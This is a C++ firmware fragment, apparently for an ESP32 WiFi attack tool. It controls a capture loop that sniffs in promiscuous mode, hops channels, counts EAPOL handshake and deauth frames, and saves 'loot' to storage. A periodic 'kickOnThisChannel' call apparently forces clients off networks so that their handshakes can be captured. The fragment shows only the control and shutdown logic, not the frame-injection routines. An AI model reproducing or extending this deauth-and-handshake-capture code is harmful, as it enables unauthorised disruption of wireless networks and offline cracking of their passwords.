    s_pinSsid[0] = 0;
    if (ssid && ssid[0]) {
        strncpy(s_pinSsid, ssid, 32);
        s_pinSsid[32] = 0;
    }
    startCommon(RunMode::Pinned);
}

void stop() {
    if (!s_running && s_mode == RunMode::Off) return;
    bool hopped = s_hopEnabled;
    s_running = false;
    s_deauthEnabled = false;
    s_hopEnabled = false;
    s_mode = RunMode::Off;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    drainRing();
    closeFile();
    Storage::compactLoot();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
    (void)hopped;
    Serial.printf("[CAP] stopped seen=%u eapol=%u written=%u deauth=%u dropped=%u\n",
                  s_cnt.framesSeen, s_cnt.framesEapol,
                  s_cnt.framesWritten, s_cnt.framesDeauth,
                  s_cnt.framesDropped);
}

bool isRunning() { return s_running; }
RunMode runMode() { return s_mode; }
bool isLocked() { return s_running && s_lockUntil != 0 && millis() < s_lockUntil; }

const Counters& counters() { return s_cnt; }

void loop() {
    if (!s_running) return;

    drainRing();
    maybeRotateMethod();

    uint32_t now = millis();
    if (isLocked()) {
        if (now - s_lastHopMs >= 400) {
            s_lastHopMs = now;
            kickOnThisChannel();
        }
        return;
    }

    if (!s_hopEnabled) {
        if (s_pinOk && now - s_lastHopMs >= 400) {
            s_lastHopMs = now;
            kickOnThisChannel();
        }
        return;
    }
    if (now - s_lastHopMs >= s_hopMs) {
        s_lastHopMs = now;
        uint8_t hopN = 0;
        const uint8_t* hops = hopTable(&hopN);
        if (hopN == 0) return;
        s_channelIdx = (uint8_t)((s_channelIdx + 1) % hopN);
        uint8_t ch = hops[s_channelIdx];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        s_cnt.currentChannel = ch;
        kickOnThisChannel();
    }
}

} // namespace Cap
